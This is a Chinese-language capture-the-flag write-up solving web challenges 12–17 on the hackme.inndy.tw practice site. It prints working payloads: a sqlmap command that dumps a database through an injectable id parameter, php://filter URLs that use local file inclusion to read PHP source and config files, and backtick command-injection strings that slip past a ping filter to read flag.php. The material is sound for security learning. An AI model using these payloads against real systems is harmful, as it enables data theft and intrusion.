# Web

## 12: hide and seek

在主页代码里面，搜索 FLAG 即可。

## 13: guestbook

> [sqlmap](http://sqlmap.org/) is your friend.

所以让我们的「好朋友」出场吧。

最终可以发现，`https://hackme.inndy.tw/gb/?mod=read&id=10` 中的 `id` 参数可以 SQL 注入。于是最终的 payload:

```shell
sqlmap -u "https://hackme.inndy.tw/gb/?mod=read&id=10" -p id --dbs -D g8 --dump
```

## 14: LFI

LFI 是什么？它是 Local File Inclusion（本地文件包含）的缩写。

可以观察到该题的 URL 如下：

```
https://hackme.inndy.tw/lfi/?page=pages/index
https://hackme.inndy.tw/lfi/?page=pages/intro
https://hackme.inndy.tw/lfi/?page=pages/login
https://hackme.inndy.tw/lfi/?page=pages/flag
```

因此可以猜测，`page` 参数可以会有文件包含漏洞。访问 `https://hackme.inndy.tw/lfi/?page=notfound`（不存在的文件）可以看到一个小彩蛋 233333。

直接访问 `https://hackme.inndy.tw/lfi/?page=pages/flag` 得不到任何东西。根据提示 `php://filter`，可以构造：

```
https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/flag
```

将得到的内容用 base64 解码，得到：

```php+HTML
Can you read the flag<?php require('config.php'); ?>?
```

emmm 那看看 `config.php` 里面是什么吧。Payload:

```
https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/config
```

解码后即可得到 flag。

## 15: homepage

主页中引用了 `https://hackme.inndy.tw/cute.js`，复制下来在控制台里运行然后扫码即可。

## 16: ping

源代码显示这个程序会对输入进行检测，然后执行 `ping`。我们的目标是命令执行，而不是真去  `ping`。PHP 中的 `exec()` 有点像 C 库的 `system()`，都是调用系统 shell 来执行命令，而不是直接去 `execve()`，所以我们可以在参数中加一点东西，让 shell 执行开发者意料之外的命令。有一些限制条件：

- 我们的 payload 不能超过 15 个字符。
- 一些特定的单词、符号不能够出现。

虽然很多常见的符号被过滤了，但是 `` ` `` 没有被过滤掉。

可以看看目录下面有什么：

```
`ls`
```

返回：

```
ping: unknown host flag.php
index.php
```

很明显，我们需要查看 `flag.php` 的内容，但是 `cat` 被过滤了。所以考虑用 `head` 或者 `tail` 来查看 flag.php。`flag` 被过滤了，但是可以用通配符。

Payload:

```
`tail f*`
```

## 17: scoreboard

记分板页面隐藏着怎样的秘密？查看源代码，没有发现什么有用的东西。转向网络请求，发现返回头的 `x-flag` 参数就是我们要的 flag。